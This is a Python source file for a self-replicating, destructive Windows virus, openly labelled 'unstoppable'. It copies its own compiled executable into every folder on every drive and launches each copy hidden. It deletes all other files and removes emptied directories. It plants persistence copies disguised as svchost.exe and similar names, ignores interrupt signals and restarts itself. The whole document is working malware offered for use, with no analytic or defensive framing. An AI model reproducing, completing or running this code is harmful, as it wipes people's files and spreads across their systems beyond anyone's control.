#!/usr/bin/env python3
"""
WINDOWS EXE REPLICATOR - Unstoppable Mode
- Compiles to .exe (no Python needed on target)
- Replicates as .exe files everywhere
- Windows only (ignores Linux/Mac)
- Secret stop: Win+S+T+O+P

Compile with: pyinstaller --onefile --noconsole unstoppable_exe.py
"""

import os
import time
import shutil
import subprocess
import sys
import platform
from datetime import datetime
import string
import random
import signal
import ctypes


# Only run on Windows
if platform.system() != 'Windows':
    print("This version is Windows-only!")
    sys.exit(0)


# Global stop flag
STOP_REQUESTED = False
KEY_SEQUENCE = []
REQUIRED_SEQUENCE = ['s', 't', 'o', 'p']


def is_admin():
    """Check if running as administrator"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def setup_keyboard_listener():
    """Setup keyboard listener for Win+S+T+O+P"""
    global STOP_REQUESTED, KEY_SEQUENCE
    
    try:
        import keyboard
        
        def on_key_press(event):
            global STOP_REQUESTED, KEY_SEQUENCE
            
            if keyboard.is_pressed('windows') or keyboard.is_pressed('win'):
                key = event.name.lower()
                KEY_SEQUENCE.append(key)
                
                if len(KEY_SEQUENCE) > 4:
                    KEY_SEQUENCE.pop(0)
                
                if KEY_SEQUENCE == REQUIRED_SEQUENCE:
                    print("\n🔓 SECRET STOP DETECTED!")
                    STOP_REQUESTED = True
                    KEY_SEQUENCE = []
        
        keyboard.on_press(on_key_press)
        return True
    except ImportError:
        print("⚠️ keyboard module not found - install with: pip install keyboard")
        return False


def ignore_signals():
    """Ignore Ctrl+C and other signals"""
    def signal_handler(signum, frame):
        print(f"\n⛔ Signal ignored! Use Win+S+T+O+P to stop")
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)


def get_exe_path():
    """Get path to current executable"""
    if getattr(sys, 'frozen', False):
        # Running as compiled exe
        return sys.executable
    else:
        # Running as script
        return __file__


def get_exe_data():
    """Read current executable binary data"""
    try:
        exe_path = get_exe_path()
        with open(exe_path, 'rb') as f:
            return f.read()
    except Exception as e:
        print(f"⚠️ Cannot read exe: {e}")
        return None


def create_persistence():
    """Create persistence copies of the exe"""
    exe_data = get_exe_data()
    if not exe_data:
        return
    
    # Windows persistence locations
    persistence_locations = [
        os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'svchost.exe'),
        os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'system32.exe'),
        os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Public'), 'updater.exe'),
        os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Temp'), 'service.exe'),
        'C:\\Users\\Public\\backup.exe',
    ]
    
    for location in persistence_locations:
        try:
            os.makedirs(os.path.dirname(location), exist_ok=True)
            
            # Write exe
            with open(location, 'wb') as f:
                f.write(exe_data)
            
            # Try to run it
            try:
                subprocess.Popen([location],
                               creationflags=subprocess.CREATE_NO_WINDOW,
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
                print(f"✓ Persistence: {location}")
            except:
                pass
        except Exception as e:
            pass


def restart_self():
    """Restart this executable"""
    try:
        exe_path = get_exe_path()
        subprocess.Popen([exe_path],
                        creationflags=subprocess.CREATE_NO_WINDOW,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL)
    except:
        pass


def get_all_drives():
    """Get all Windows drives (C:, D:, E:, etc.)"""
    drives = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:\\"
        if os.path.exists(drive):
            drives.append(drive)
            print(f"📀 Drive: {letter}:")
    return drives


def create_random_files(folder_path, count=5):
    """Create random junk files"""
    try:
        for i in range(count):
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            content = ''.join(random.choices(string.ascii_letters, k=1024 * 50))  # 50KB
            file_path = os.path.join(folder_path, f"{name}.txt")
            with open(file_path, 'w') as f:
                f.write(content)
    except:
        pass


def process_all_folders(file_content="INFECTED", spawn_exes=True, create_junk=True):
    """Process all folders - replicate .exe everywhere"""
    global STOP_REQUESTED
    
    stats = {
        'folders_processed': 0,
        'exe_created': 0,
        'processes_spawned': 0,
        'files_deleted': 0,
    }
    
    exe_data = get_exe_data()
    if not exe_data:
        print("⚠️ Cannot replicate - no exe data")
        return stats
    
    drives = get_all_drives()
    
    for drive in drives:
        if STOP_REQUESTED:
            break
        
        # Skip critical Windows directories
        skip_paths = [
            f"{drive}Windows",
            f"{drive}Program Files",
            f"{drive}Program Files (x86)",
            f"{drive}ProgramData",
            f"{drive}$Recycle.Bin",
            f"{drive}System Volume Information"
        ]
        
        try:
            for root, dirs, files in os.walk(drive, topdown=True):
                if STOP_REQUESTED:
                    break
                
                # Skip critical directories
                if any(root.startswith(skip) for skip in skip_paths):
                    dirs.clear()  # Don't descend
                    continue
                
                stats['folders_processed'] += 1
                
                # Progress
                if stats['folders_processed'] % 100 == 0:
                    print(f"💀 {stats['folders_processed']} folders...")
                
                # Create hlo.txt
                try:
                    hlo_txt = os.path.join(root, 'hlo.txt')
                    if not os.path.exists(hlo_txt):
                        with open(hlo_txt, 'w') as f:
                            f.write(f"{file_content}\n{datetime.now()}")
                except:
                    pass
                
                # Create hlo.exe (replica)
                try:
                    hlo_exe = os.path.join(root, 'hlo.exe')
                    if not os.path.exists(hlo_exe):
                        with open(hlo_exe, 'wb') as f:
                            f.write(exe_data)
                        stats['exe_created'] += 1
                        
                        # Spawn the exe
                        if spawn_exes:
                            try:
                                subprocess.Popen([hlo_exe],
                                               creationflags=subprocess.CREATE_NO_WINDOW,
                                               stdout=subprocess.DEVNULL,
                                               stderr=subprocess.DEVNULL)
                                stats['processes_spawned'] += 1
                            except:
                                pass
                except:
                    pass
                
                # Create junk files
                if create_junk and random.random() > 0.8:  # 20% chance
                    create_random_files(root, count=random.randint(2, 5))
                
                # Delete other files
                for filename in files:
                    if filename not in ['hlo.txt', 'hlo.exe']:
                        try:
                            file_path = os.path.join(root, filename)
                            os.remove(file_path)
                            stats['files_deleted'] += 1
                        except:
                            pass
                
                # Delete empty subdirectories
                for dirname in dirs[:]:  # Copy list to modify during iteration
                    dir_path = os.path.join(root, dirname)
                    try:
                        contents = set(os.listdir(dir_path))
                        if not contents or contents.issubset({'hlo.txt', 'hlo.exe'}):
                            shutil.rmtree(dir_path)
                            dirs.remove(dirname)
                    except:
                        pass
        
        except Exception as e:
            print(f"⚠️ Error on {drive}: {e}")
    
    return stats


def hide_console():
    """Hide console window (for compiled exe)"""
    try:
        import win32gui
        import win32con
        
        window = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
    except:
        pass


def run_unstoppable(file_content="💀 INFECTED 💀", sleep_interval=2, spawn_exes=True, create_junk=True):
    """Run in unstoppable mode"""
    global STOP_REQUESTED
    
    iteration = 0
    
    print("="*70)
    print("⛔ WINDOWS EXE REPLICATOR - UNSTOPPABLE MODE ⛔")
    print("="*70)
    print(f"Running as: {'EXE' if getattr(sys, 'frozen', False) else 'Script'}")
    print(f"Admin: {'Yes' if is_admin() else 'No'}")
    print(f"PID: {os.getpid()}")
    print("\n🔒 PROTECTIONS:")
    print("✓ Ctrl+C disabled")
    print("✓ Signals ignored")
    print("✓ Auto-restart enabled")
    print("✓ Persistence copies")
    print("\n🔓 STOP: Win+S+T+O+P")
    print("="*70)
    
    # Setup
    ignore_signals()
    setup_keyboard_listener()
    create_persistence()
    restart_self()
    
    print("\n🔥 STARTING IN 3 SECONDS...\n")
    time.sleep(3)
    
    # Optionally hide console
    # hide_console()  # Uncomment to hide window
    
    while not STOP_REQUESTED:
        try:
            iteration += 1
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            print(f"\n💀 ITERATION {iteration} - {timestamp}")
            
            stats = process_all_folders(
                file_content=file_content,
                spawn_exes=spawn_exes,
                create_junk=create_junk
            )
            
            print(f"Folders: {stats['folders_processed']} | "
                  f"EXEs: {stats['exe_created']} | "
                  f"Spawned: {stats['processes_spawned']} | "
                  f"Deleted: {stats['files_deleted']}")
            
            # Restart backup every 5 iterations
            if iteration % 5 == 0:
                restart_self()
            
            print(f"⏱️ Next in {sleep_interval}s (Win+S+T+O+P to stop)")
            
            # Check for stop during sleep
            for _ in range(sleep_interval * 10):
                if STOP_REQUESTED:
                    break
                time.sleep(0.1)
        
        except KeyboardInterrupt:
            print("\n⛔ Ctrl+C ignored!")
            continue
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(1)
            continue
    
    print("\n" + "="*70)
    print("🔓 STOPPED VIA SECRET SEQUENCE")
    print("="*70)
    sys.exit(0)


if __name__ == "__main__":
    # Configuration
    FILE_CONTENT = "💀 WINDOWS EXE VIRUS - INFECTED 💀"
    SLEEP_INTERVAL = 2
    SPAWN_EXES = True
    CREATE_JUNK = True
    
    print("="*70)
    print("⛔ WINDOWS EXE REPLICATOR ⛔")
    print("="*70)
    print("\n🎯 FEATURES:")
    print("✓ Windows-only (ignores Linux)")
    print("✓ Replicates as .exe (no Python needed)")
    print("✓ Spawns .exe in every folder")
    print("✓ Deletes all other files")
    print("✓ Creates junk files")
    print("✓ Ctrl+C disabled")
    print("✓ Auto-restart")
    print("✓ Multiple persistence copies")
    print("\n🔓 STOP: Win+S+T+O+P")
    print("="*70)
    
    drives = get_all_drives()
    print(f"\n📀 {len(drives)} drive(s) detected")
    
    print("\n⚠️ This will replicate .exe files everywhere!")
    print("="*70)
    
    run_unstoppable(
        file_content=FILE_CONTENT,
        sleep_interval=SLEEP_INTERVAL,
        spawn_exes=SPAWN_EXES,
        create_junk=CREATE_JUNK
    )
